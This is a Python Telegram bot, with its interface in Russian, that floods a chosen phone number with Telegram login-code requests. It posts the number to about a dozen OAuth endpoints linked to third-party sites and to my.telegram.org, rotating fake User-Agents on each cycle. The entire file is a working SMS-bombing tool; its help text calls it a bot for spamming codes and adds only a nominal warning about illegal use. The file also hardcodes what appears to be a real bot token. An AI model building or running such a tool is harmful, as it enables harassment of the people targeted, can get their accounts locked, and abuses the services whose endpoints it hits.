import telebot
from telebot import types
import asyncio
import aiohttp
import random
from fake_useragent import UserAgent

BOT_TOKEN = "8274678821:AAGJBACLAhqr2CsNGjP-snFhgMv6zYGcPZE"
bot = telebot.TeleBot(BOT_TOKEN)

class FloodBot:
    def __init__(self):
        self.ua = UserAgent()
        self.urls = [
            'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
            'https://translations.telegram.org/auth/request',
            'https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F',
            'https://oauth.telegram.org/auth?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&request_access=write&return_to=https%3A%2F%2Fbot-t.com%2Flogin',
            'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
            'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
            'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23',
            'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin',
            'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F',
            'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch',
            'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin',
            'https://my.telegram.org/auth/send_password'
        ]

    async def send_request(self, session, url, headers, data):
        try:
            async with session.post(url, headers=headers, data=data) as response:
                return response.status == 200
        except:
            return False

    async def start_flood(self, phone, cycles, message=None):
        success_count = 0
        total_requests = len(self.urls) * cycles
        
        if message:
            status_msg = bot.send_message(message.chat.id, 
                                        f"🚀 Запускаем флуд...\n"
                                        f"📱 Номер: {phone}\n"
                                        f"🔄 Циклов: {cycles}\n"
                                        f"📊 Всего запросов: {total_requests}")

        try:
            async with aiohttp.ClientSession() as session:
                for cycle in range(cycles):
                    if message:
                        # Обновляем статус каждый цикл
                        try:
                            bot.edit_message_text(
                                f"⏳ Выполняется цикл {cycle + 1}/{cycles}\n"
                                f"✅ Успешно: {success_count}\n"
                                f"📱 Номер: {phone}",
                                message.chat.id,
                                status_msg.message_id
                            )
                        except:
                            pass

                    user_agent = self.ua.random
                    headers = {'user-agent': user_agent}
                    
                    tasks = [self.send_request(session, url, headers, {'phone': phone}) for url in self.urls]
                    results = await asyncio.gather(*tasks)
                    
                    cycle_success = sum(results)
                    success_count += cycle_success
                    
                    # Небольшая задержка между циклами
                    await asyncio.sleep(0.5)

        except Exception as e:
            if message:
                bot.send_message(message.chat.id, f"❌ Ошибка: {str(e)}")
            return 0

        return success_count

flood_bot = FloodBot()

@bot.message_handler(commands=['start'])
def start_message(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    item1 = types.KeyboardButton("📱 Начать флуд")
    item2 = types.KeyboardButton("❓ Помощь")
    markup.add(item1, item2)
    
    bot.send_message(message.chat.id,
                    "🔥 Бот для спама кодами\n\n"
                    "Отправляет запросы на различные сервисы Telegram\n"
                    "Нажмите '📱 Начать флуд' чтобы начать",
                    reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == "📱 Начать флуд")
def start_flood_handler(message):
    msg = bot.send_message(message.chat.id, "Введите номер телефона (только цифры, с кодом страны):")
    bot.register_next_step_handler(msg, process_phone_input)

def process_phone_input(message):
    phone = message.text.strip()
    
    if not phone.isdigit() or len(phone) < 10:
        bot.send_message(message.chat.id, "❌ Неверный формат номера. Используйте только цифры (например: 79991234567)")
        return
    
    # Сохраняем номер и запрашиваем количество циклов
    bot.send_message(message.chat.id, f"📱 Номер принят: +{phone}")
    msg = bot.send_message(message.chat.id, "Введите количество циклов (рекомендуется 1-10):")
    bot.register_next_step_handler(msg, process_cycles_input, phone)

def process_cycles_input(message, phone):
    try:
        cycles = int(message.text.strip())
        if cycles <= 0 or cycles > 50:
            bot.send_message(message.chat.id, "❌ Количество циклов должно быть от 1 до 50")
            return
            
        # Запрашиваем ник (опционально)
        msg = bot.send_message(message.chat.id, 
                             "Введите ник для сообщения (или отправьте '-' для пропуска):")
        bot.register_next_step_handler(msg, process_nick_input, phone, cycles)
        
    except ValueError:
        bot.send_message(message.chat.id, "❌ Введите число!")

def process_nick_input(message, phone, cycles):
    nick = message.text.strip()
    if nick == '-':
        nick = "ARMAT"
    
    # Запускаем флуд
    bot.send_message(message.chat.id, 
                    f"🎯 Параметры флуда:\n"
                    f"📱 Номер: +{phone}\n"
                    f"🔄 Циклов: {cycles}\n"
                    f"👤 Ник: {nick}\n"
                    f"🚀 Запускаем...")
    
    # Запускаем асинхронную задачу
    asyncio.run(run_flood_async(phone, cycles, message))

async def run_flood_async(phone, cycles, message):
    success_count = await flood_bot.start_flood(phone, cycles, message)
    
    # Отправляем результат
    result_text = (f"📊 Флуд завершен!\n"
                  f"📱 Номер: +{phone}\n"
                  f"🔄 Циклов: {cycles}\n"
                  f"✅ Успешных запросов: {success_count}\n"
                  f"📈 Эффективность: {(success_count/(len(flood_bot.urls)*cycles))*100:.1f}%")
    
    bot.send_message(message.chat.id, result_text)

@bot.message_handler(func=lambda message: message.text == "❓ Помощь")
def help_handler(message):
    help_text = """
📋 Инструкция по использованию:

1. Нажмите "📱 Начать флуд"
2. Введите номер телефона (только цифры)
3. Укажите количество циклов (1-10 нормально, до 50 макс)
4. Введите ник или пропустите

⚡ Что делает бот:
- Отправляет запросы кода на 12+ сервисов Telegram
- Использует разные User-Agent
- Работает асинхронно для скорости

⚠️ Внимание:
- Не используйте для незаконных целей
- Большое количество циклов может заблокировать номер
- Используйте на свой страх и риск
    """
    bot.send_message(message.chat.id, help_text)

@bot.message_handler(commands=['stats'])
def stats_handler(message):
    stats_text = """
📊 Статистика сервисов:
Бот отправляет запросы на 12 различных сервисов Telegram включая:
- Telegram OAuth
- Fragment.com  
- Bot-T.com
- Combot.org
- Telegram Store
- И другие...
    """
    bot.send_message(message.chat.id, stats_text)

@bot.message_handler(commands=['stop'])
def stop_handler(message):
    bot.send_message(message.chat.id, "🛑 Бот остановлен. Для запуска используйте /start")

if __name__ == "__main__":
    print("🔥 Бот для спама кодами запущен...")
    bot.infinity_polling()
